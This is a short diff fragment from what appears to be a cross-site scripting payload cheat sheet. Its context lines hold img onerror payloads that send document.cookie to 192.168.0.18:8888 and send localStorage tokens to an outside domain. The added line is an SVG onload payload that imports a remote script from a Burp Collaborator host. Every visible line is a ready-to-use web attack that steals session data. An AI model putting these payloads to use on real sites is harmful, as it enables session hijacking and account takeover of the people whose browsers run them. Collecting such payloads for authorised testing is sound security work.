@@ -91,6 +91,8 @@ body:document.cookie
 <img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
 
 <img src onerror=fetch("https://0xbro.red/?token="+localStorage.token)>
+
+<svg/onload=import('//burpcollaborator')>
 ```
 
 Server:
